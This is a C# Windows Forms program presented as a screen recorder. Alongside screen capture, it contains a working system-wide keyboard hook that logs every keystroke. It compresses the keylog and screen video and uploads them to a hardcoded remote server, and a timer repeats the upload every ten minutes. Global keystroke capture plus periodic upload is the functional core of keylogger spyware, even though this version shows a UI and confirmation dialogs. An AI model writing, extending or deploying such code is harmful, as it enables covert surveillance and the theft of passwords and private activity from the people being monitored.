using System;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Threading.Tasks;
using System.Diagnostics;
using SharpAvi;
using SharpAvi.Output;
using System.IO.Compression;
using System.Net.Http;
using SevenZip;
using SevenZip.Sdk;
using System.Timers;

namespace ScreenRecorder
{
    public partial class MainForm : Form
    {
        private bool isRecording = false;
        private KeyboardHook? keyboardHook;
        private StreamWriter? keylogWriter;
        private string? keylogPath;
        private System.Windows.Forms.Timer? screenCaptureTimer;
        private Rectangle screenBounds;
        private string? videoOutputPath;
        private int frameRate = 10; // 默认帧率
        private int frameCount = 0;
        private int videoQuality = 20; // 视频质量参数，范围0-100
        private string remoteServerUrl = "http://192.168.79.28:5000/api/upload/file"; // 远程存储服务器地址
        private System.Timers.Timer? autoUploadTimer; // 自动上传定时器
        private DateTime lastAutoUploadTime; // 上次自动上传时间
        private int autoUploadIntervalMinutes = 10; // 自动上传间隔（分钟）
        
        // AVI视频录制相关
        private AviWriter? aviWriter;
        private IAviVideoStream? videoStream;

        public MainForm()
        {
            InitializeComponent();
            screenBounds = Screen.PrimaryScreen.Bounds;
            keyboardHook = new KeyboardHook();
            keyboardHook.KeyPressed += KeyboardHook_KeyPressed;
        }

        private void InitializeComponent()
        {
            this.btnStartStop = new Button();
            this.lblStatus = new Label();
            this.trackBarQuality = new TrackBar();
            this.lblQuality = new Label();
            this.SuspendLayout();
            
            // btnStartStop
            this.btnStartStop.Location = new Point(12, 12);
            this.btnStartStop.Name = "btnStartStop";
            this.btnStartStop.Size = new Size(120, 30);
            this.btnStartStop.TabIndex = 0;
            this.btnStartStop.Text = "开始录制";
            this.btnStartStop.UseVisualStyleBackColor = true;
            this.btnStartStop.Click += new EventHandler(this.btnStartStop_Click);
            
            // lblStatus
            this.lblStatus.AutoSize = true;
            this.lblStatus.Location = new Point(12, 54);
            this.lblStatus.Name = "lblStatus";
            this.lblStatus.Size = new Size(77, 15);
            this.lblStatus.TabIndex = 1;
            this.lblStatus.Text = "状态: 就绪";
            
            // trackBarQuality
            this.trackBarQuality.Location = new Point(12, 90);
            this.trackBarQuality.Name = "trackBarQuality";
            this.trackBarQuality.Size = new Size(250, 45);
            this.trackBarQuality.TabIndex = 2;
            this.trackBarQuality.Minimum = 1;
            this.trackBarQuality.Maximum = 100;
            this.trackBarQuality.Value = 20;
            this.trackBarQuality.Scroll += new EventHandler(this.trackBarQuality_Scroll);
            
            // lblQuality
            this.lblQuality.AutoSize = true;
            this.lblQuality.Location = new Point(12, 76);
            this.lblQuality.Name = "lblQuality";
            this.lblQuality.Size = new Size(84, 15);
            this.lblQuality.TabIndex = 3;
            this.lblQuality.Text = "视频质量: 20";
            
            // MainForm
            this.ClientSize = new Size(284, 140);
            this.Controls.Add(this.lblQuality);
            this.Controls.Add(this.trackBarQuality);
            this.Controls.Add(this.lblStatus);
            this.Controls.Add(this.btnStartStop);
            this.Name = "MainForm";
            this.Text = "屏幕录制工具";
            this.FormClosing += new FormClosingEventHandler(this.MainForm_FormClosing);
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        private void btnStartStop_Click(object sender, EventArgs e)
        {
            if (!isRecording)
            {
                StartRecording();
            }
            else
            {
                StopRecording();
            }
        }

        private void StartRecording()
        {
            try
            {
                // 创建输出目录（使用当前应用程序目录）
                string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
                string captureFolder = Path.Combine(appDirectory, "ScreenCaptures");
                Directory.CreateDirectory(captureFolder);
                
                // 设置视频输出路径
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
                keylogPath = Path.Combine(captureFolder, $"KeyLog_{timestamp}.txt");
                videoOutputPath = Path.Combine(captureFolder, $"ScreenRecording_{timestamp}.avi");

                // 初始化键盘记录
                keylogWriter = new StreamWriter(keylogPath);
                keylogWriter.WriteLine($"键盘记录开始于: {DateTime.Now}");
                keylogWriter.Flush();

                // 清空帧计数
                frameCount = 0;

                // 创建AVI视频写入器
                aviWriter = new AviWriter(videoOutputPath)
                {
                    FramesPerSecond = frameRate,
                    EmitIndex1 = true
                };

                // 创建视频流
                videoStream = aviWriter.AddVideoStream();
                videoStream.Width = screenBounds.Width;
                videoStream.Height = screenBounds.Height;
                videoStream.Codec = SharpAvi.CodecIds.MotionJpeg;
                videoStream.BitsPerPixel = SharpAvi.BitsPerPixel.Bpp24;
                videoStream.Name = "Screen Capture";

                // 启动屏幕捕获定时器
                screenCaptureTimer = new System.Windows.Forms.Timer();
                screenCaptureTimer.Interval = 1000 / frameRate; // 根据帧率设置间隔
                screenCaptureTimer.Tick += ScreenCaptureTimer_Tick;
                screenCaptureTimer.Start();

                // 启动键盘钩子
                keyboardHook?.Start();

                // 初始化并启动自动上传定时器
                InitializeAutoUploadTimer();

                isRecording = true;
                btnStartStop.Text = "停止录制";
                lblStatus.Text = "状态: 录制中...";
            }
            catch (Exception ex)
            {
                MessageBox.Show($"启动录制时出错: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void StopRecording()
        {
            try
            {
                // 停止屏幕捕获
                if (screenCaptureTimer != null)
                {
                    screenCaptureTimer.Stop();
                    screenCaptureTimer.Dispose();
                    screenCaptureTimer = null;
                }

                // 停止键盘钩子
                keyboardHook?.Stop();

                // 关闭键盘记录文件
                if (keylogWriter != null)
                {
                    keylogWriter.WriteLine($"键盘记录结束于: {DateTime.Now}");
                    keylogWriter.Close();
                    keylogWriter = null;
                }

                lblStatus.Text = "状态: 正在完成视频录制...";
                Application.DoEvents();

                // 关闭AVI视频写入器
                if (aviWriter != null)
                {
                    aviWriter.Close();
                    aviWriter = null;
                }

                // 停止并释放自动上传定时器
                if (autoUploadTimer != null)
                {
                    autoUploadTimer.Stop();
                    autoUploadTimer.Dispose();
                    autoUploadTimer = null;
                }
                
                isRecording = false;
                btnStartStop.Text = "开始录制";
                lblStatus.Text = "状态: 就绪";

                MessageBox.Show($"录制已完成！\n\n视频保存在: {videoOutputPath}\n键盘记录保存在: {keylogPath}", "录制完成", MessageBoxButtons.OK, MessageBoxIcon.Information);

                // 询问用户是否要压缩并上传文件
                if (MessageBox.Show("是否需要压缩并上传录制的文件到远程服务器？", "压缩上传", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                {
                    string zipFilePath = CompressFiles(videoOutputPath, keylogPath);
                    if (!string.IsNullOrEmpty(zipFilePath))
                    {
                        UploadToRemoteServer(zipFilePath);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"停止录制时出错: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void ScreenCaptureTimer_Tick(object? sender, EventArgs e)
        {
            try
            {
                // 捕获屏幕
                using (Bitmap bitmap = new Bitmap(screenBounds.Width, screenBounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(screenBounds.Location, Point.Empty, screenBounds.Size);
                        
                        // 添加鼠标指针
                        Point cursorPosition = Cursor.Position;
                        g.DrawEllipse(Pens.Red, 
                            cursorPosition.X - screenBounds.X - 5, 
                            cursorPosition.Y - screenBounds.Y - 5, 
                            10, 10);
                    }

                    // 将帧写入AVI视频
                    if (videoStream != null)
                    {
                        using (MemoryStream ms = new MemoryStream())
                        {
                            // 使用视频质量参数保存JPEG图像
                            EncoderParameter qualityParam = new EncoderParameter(
                                System.Drawing.Imaging.Encoder.Quality, videoQuality);
                            EncoderParameters encoderParams = new EncoderParameters(1);
                            encoderParams.Param[0] = qualityParam;
                            
                            // 获取JPEG编码器
                            ImageCodecInfo jpegCodec = GetEncoderInfo(ImageFormat.Jpeg);
                            
                            // 保存图像到内存流，使用指定的质量参数
                            bitmap.Save(ms, jpegCodec, encoderParams);
                            
                            byte[] jpegBytes = ms.ToArray();
                            
                            // 写入视频流
                            videoStream.WriteFrame(true, jpegBytes, 0, jpegBytes.Length);
                        }
                        frameCount++;
                    }

                    // 更新状态
                lblStatus.Text = $"状态: 正在录制 (已捕获 {frameCount} 帧)";
                
                // 检查是否需要自动上传（每分钟检查一次）
                if (DateTime.Now.Minute % 1 == 0 && DateTime.Now.Second < 2)
                {
                    CheckAutoUpload();
                }
            }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"捕获屏幕时出错: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                StopRecording();
            }
        }

        // 获取指定图像格式的编码器信息
        private ImageCodecInfo GetEncoderInfo(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            throw new Exception($"找不到 {format} 格式的编码器");
        }

        private void KeyboardHook_KeyPressed(object sender, KeyPressedEventArgs e)
        {
            if (keylogWriter != null)
            {
                keylogWriter.WriteLine($"[{DateTime.Now:HH:mm:ss.fff}] Key: {e.Key}, Modifiers: {e.Modifiers}");
                keylogWriter.Flush();
            }
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (isRecording)
            {
                StopRecording();
            }
        }

        private void trackBarQuality_Scroll(object sender, EventArgs e)
        {
            if (sender is TrackBar trackBar)
            {
                videoQuality = trackBar.Value;
                lblQuality.Text = $"视频质量: {videoQuality}";
            }
        }

        private Button btnStartStop = null!;
        private Label lblStatus = null!;
        private TrackBar trackBarQuality = null!;
        private Label lblQuality = null!;

        // 压缩文件方法
        private string CompressFiles(string videoFilePath, string? keylogFilePath = null)
        {
            try
            {
                // 初始化SevenZipSharp库
                SevenZipCompressor.SetLibraryPath(FindSevenZipLibrary());

                // 创建压缩文件路径
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
                string zipFilePath = Path.Combine(Path.GetDirectoryName(videoFilePath), "ScreenCapture_" + timestamp + ".7z");

                // 准备文件列表
                List<string> filesToCompress = new List<string> { videoFilePath };
                if (!string.IsNullOrEmpty(keylogFilePath) && File.Exists(keylogFilePath))
                {
                    filesToCompress.Add(keylogFilePath);
                }

                // 计算原始大小
                long originalSize = 0;
                if (File.Exists(videoFilePath))
                {
                    originalSize += new FileInfo(videoFilePath).Length;
                }
                if (!string.IsNullOrEmpty(keylogFilePath) && File.Exists(keylogFilePath))
                {
                    originalSize += new FileInfo(keylogFilePath).Length;
                }

                // 创建SevenZipCompressor实例并设置最大压缩率
                SevenZipCompressor compressor = new SevenZipCompressor();
                compressor.CompressionLevel = SevenZip.CompressionLevel.Ultra;
                compressor.CompressionMethod = SevenZip.CompressionMethod.Lzma2;
                compressor.CompressionMode = SevenZip.CompressionMode.Create;

                // 显示压缩进度
                using (Form progressForm = new Form())
                {
                    progressForm.Text = "正在压缩文件...";
                    progressForm.ClientSize = new Size(300, 100);
                    progressForm.StartPosition = FormStartPosition.CenterParent;
                    progressForm.ControlBox = false;

                    ProgressBar progressBar = new ProgressBar();
                    progressBar.Location = new Point(20, 20);
                    progressBar.Width = 260;
                    progressBar.Style = ProgressBarStyle.Marquee;

                    Label label = new Label();
                    label.Text = "正在准备...";
                    label.Location = new Point(20, 50);
                    label.AutoSize = true;

                    progressForm.Controls.Add(progressBar);
                    progressForm.Controls.Add(label);

                    // 显示进度窗口
                    progressForm.Show();
                    Application.DoEvents();

                    // 使用SevenZipSharp压缩文件
                    compressor.CompressFiles(zipFilePath, filesToCompress.ToArray());

                    progressForm.Close();
                }

                // 检查压缩是否成功
                if (!File.Exists(zipFilePath))
                {
                    MessageBox.Show("压缩失败，未生成压缩文件！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return string.Empty;
                }

                // 显示压缩成功信息
                long compressedSize = new FileInfo(zipFilePath).Length;
                double compressionRatio = (double)compressedSize / originalSize * 100;

                MessageBox.Show("文件压缩成功！\n\n压缩文件保存在: " + zipFilePath + "\n原始大小: " + (originalSize / 1024.0 / 1024.0).ToString("F2") + " MB\n压缩大小: " + (compressedSize / 1024.0 / 1024.0).ToString("F2") + " MB\n压缩率: " + compressionRatio.ToString("F2") + "%", "压缩成功", MessageBoxButtons.OK, MessageBoxIcon.Information);

                return zipFilePath;
            }
            catch (Exception ex)
            {
                MessageBox.Show("压缩文件时出错: " + ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return string.Empty;
            }
        }

        // 初始化自动上传定时器
        private void InitializeAutoUploadTimer()
        {
            lastAutoUploadTime = DateTime.Now;
            
            autoUploadTimer = new System.Timers.Timer();
            autoUploadTimer.Interval = 60000; // 每分钟检查一次
            autoUploadTimer.Elapsed += AutoUploadTimer_Elapsed;
            autoUploadTimer.Start();
        }
        
        // 自动上传定时器事件处理
        private void AutoUploadTimer_Elapsed(object? sender, ElapsedEventArgs e)
        {
            this.Invoke((MethodInvoker)delegate
            {
                CheckAutoUpload();
            });
        }
        
        // 检查是否需要自动上传
        private void CheckAutoUpload()
        {
            if (!isRecording)
                return;
            
            TimeSpan elapsedTime = DateTime.Now - lastAutoUploadTime;
            if (elapsedTime.TotalMinutes >= autoUploadIntervalMinutes)
            {
                // 创建临时文件用于自动上传
                CreateTemporaryFilesForAutoUpload();
                lastAutoUploadTime = DateTime.Now;
            }
        }
        
        // 创建临时文件用于自动上传
        private void CreateTemporaryFilesForAutoUpload()
        {
            if (string.IsNullOrEmpty(videoOutputPath) || string.IsNullOrEmpty(keylogPath))
                return;
            
            try
            {
                // 关闭当前的AVI写入器和键盘记录器
                if (keylogWriter != null)
                {
                    keylogWriter.WriteLine($"自动上传点: {DateTime.Now}");
                    keylogWriter.Flush();
                }
                
                if (aviWriter != null)
                {
                    aviWriter.Close();
                    aviWriter = null;
                }
                
                // 压缩并上传当前的视频文件
                string autoUploadZipFilePath = CompressFilesForAutoUpload(videoOutputPath, keylogPath);
                if (!string.IsNullOrEmpty(autoUploadZipFilePath))
                {
                    UploadToRemoteServer(autoUploadZipFilePath);
                }
                
                // 创建新的视频文件继续录制
                string newTimestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
                string captureFolder = Path.GetDirectoryName(videoOutputPath);
                
                // 创建新的键盘记录文件
                string newKeylogPath = Path.Combine(captureFolder, $"KeyLog_{newTimestamp}_Part.txt");
                keylogWriter = new StreamWriter(newKeylogPath, true); // 追加模式
                keylogWriter.WriteLine($"继续录制: {DateTime.Now}");
                keylogWriter.Flush();
                
                // 创建新的视频文件
                string newVideoPath = Path.Combine(captureFolder, $"ScreenRecording_{newTimestamp}_Part.avi");
                
                // 保存新的路径
                keylogPath = newKeylogPath;
                videoOutputPath = newVideoPath;
                
                // 创建新的AVI写入器
                aviWriter = new AviWriter(videoOutputPath)
                {
                    FramesPerSecond = frameRate,
                    EmitIndex1 = true
                };
                
                // 创建新的视频流
                videoStream = aviWriter.AddVideoStream();
                videoStream.Width = screenBounds.Width;
                videoStream.Height = screenBounds.Height;
                videoStream.Codec = SharpAvi.CodecIds.MotionJpeg;
                videoStream.BitsPerPixel = SharpAvi.BitsPerPixel.Bpp24;
                videoStream.Name = "Screen Capture (Continued)";
                
                // 通知用户自动上传已完成
                MessageBox.Show("自动上传完成，继续录制中...", "自动上传", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"自动上传过程中出错: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        
        // 自动上传的压缩方法（无用户交互）
        private string CompressFilesForAutoUpload(string videoFilePath, string? keylogFilePath = null)
        {
            try
            {
                // 初始化SevenZipSharp库
                SevenZipCompressor.SetLibraryPath(FindSevenZipLibrary());

                // 创建压缩文件路径
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
                string? directory = Path.GetDirectoryName(videoFilePath);
                string zipFilePath = directory != null ? Path.Combine(directory, "AutoUpload_ScreenCapture_" + timestamp + ".7z") : "AutoUpload_ScreenCapture_" + timestamp + ".7z";

                // 准备文件列表
                List<string> filesToCompress = new() { videoFilePath };
                if (!string.IsNullOrEmpty(keylogFilePath) && File.Exists(keylogFilePath))
                {
                    filesToCompress.Add(keylogFilePath);
                }

                // 创建SevenZipCompressor实例并设置最大压缩率
                SevenZipCompressor compressor = new()
                {
                    CompressionLevel = SevenZip.CompressionLevel.Ultra,
                    CompressionMethod = SevenZip.CompressionMethod.Lzma2,
                    CompressionMode = SevenZip.CompressionMode.Create
                };

                // 不显示进度窗口，直接压缩
                compressor.CompressFiles(zipFilePath, filesToCompress.ToArray());

                // 检查压缩是否成功
                if (!File.Exists(zipFilePath))
                {
                    return string.Empty;
                }

                return zipFilePath;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }
        
        // 查找7z库文件
        private string FindSevenZipLibrary()
        {
            string[] possiblePaths = new string[]
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "7-Zip", "7z.dll"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "7-Zip", "7z.dll")
            };

            foreach (string path in possiblePaths)
            {
                if (File.Exists(path))
                {
                    return path;
                }
            }

            throw new FileNotFoundException("未找到7z.dll库文件！请先安装7-Zip。");
        }

        // 上传文件到远程服务器方法
        private async void UploadToRemoteServer(string zipFilePath)
        {
            if (string.IsNullOrEmpty(zipFilePath) || !File.Exists(zipFilePath))
            {
                MessageBox.Show("找不到压缩文件，无法上传！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            // 允许用户修改远程服务器URL
            using (var serverUrlForm = new Form())
            {
                serverUrlForm.Text = "设置远程服务器地址";
                serverUrlForm.ClientSize = new Size(400, 100);
                serverUrlForm.StartPosition = FormStartPosition.CenterParent;

                var label = new Label { Text = "远程服务器URL:", Location = new Point(10, 20), AutoSize = true };
                var textBox = new TextBox { Text = remoteServerUrl, Location = new Point(10, 40), Width = 380 };
                var button = new Button { Text = "确定", Location = new Point(315, 65), DialogResult = DialogResult.OK };

                serverUrlForm.Controls.Add(label);
                serverUrlForm.Controls.Add(textBox);
                serverUrlForm.Controls.Add(button);

                if (serverUrlForm.ShowDialog(this) == DialogResult.OK)
                {
                    remoteServerUrl = textBox.Text;
                }
                else
                {
                    return; // 用户取消上传
                }
            }

            try
            {
                // 显示上传进度
                using (var progressForm = new Form())
                {
                    progressForm.Text = "正在上传文件...";
                    progressForm.ClientSize = new Size(300, 100);
                    progressForm.StartPosition = FormStartPosition.CenterParent;
                    progressForm.ControlBox = false;

                    var progressBar = new ProgressBar { Location = new Point(20, 20), Width = 260 };
                    var label = new Label { Text = "准备上传...", Location = new Point(20, 50), AutoSize = true };

                    progressForm.Controls.Add(progressBar);
                    progressForm.Controls.Add(label);

                    // 显示进度窗口
                    progressForm.Show();
                    Application.DoEvents();

                    using (var httpClient = new HttpClient())
                    {
                        using (var content = new MultipartFormDataContent())
                        {
                            var fileContent = new StreamContent(File.OpenRead(zipFilePath));
                            content.Add(fileContent, "file", Path.GetFileName(zipFilePath));

                            label.Text = "正在上传...";
                            Application.DoEvents();

                            var response = await httpClient.PostAsync(remoteServerUrl, content);
                            response.EnsureSuccessStatusCode();

                            progressForm.Close();
                            MessageBox.Show("文件上传成功！", "上传成功", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"上传文件时出错: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }

    // 键盘钩子类
    public class KeyboardHook
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string? lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public event EventHandler<KeyPressedEventArgs>? KeyPressed;

        private LowLevelKeyboardProc? proc;
        private IntPtr hookId = IntPtr.Zero;

        public void Start()
        {
            if (hookId == IntPtr.Zero)
            {
                proc = HookCallback;
                using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
                using (var curModule = curProcess.MainModule)
                {
                    if (curModule != null && proc != null)
                    {
                        hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                    }
                }
            }
        }

        public void Stop()
        {
            if (hookId != IntPtr.Zero)
            {
                UnhookWindowsHookEx(hookId);
                hookId = IntPtr.Zero;
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;
                
                // 获取修饰键状态
                Keys modifiers = Keys.None;
                if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift)
                    modifiers |= Keys.Shift;
                if ((Control.ModifierKeys & Keys.Control) == Keys.Control)
                    modifiers |= Keys.Control;
                if ((Control.ModifierKeys & Keys.Alt) == Keys.Alt)
                    modifiers |= Keys.Alt;

                // 触发键盘按下事件，传递按键和修饰键信息
                KeyPressed?.Invoke(this, new KeyPressedEventArgs(key, modifiers));
            }
            
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }
    }

    public class KeyPressedEventArgs : EventArgs
    {
        public Keys Key { get; private set; }
        public Keys Modifiers { get; private set; }

        public KeyPressedEventArgs(Keys key, Keys modifiers)
        {
            Key = key;
            Modifiers = modifiers;
        }
    }
}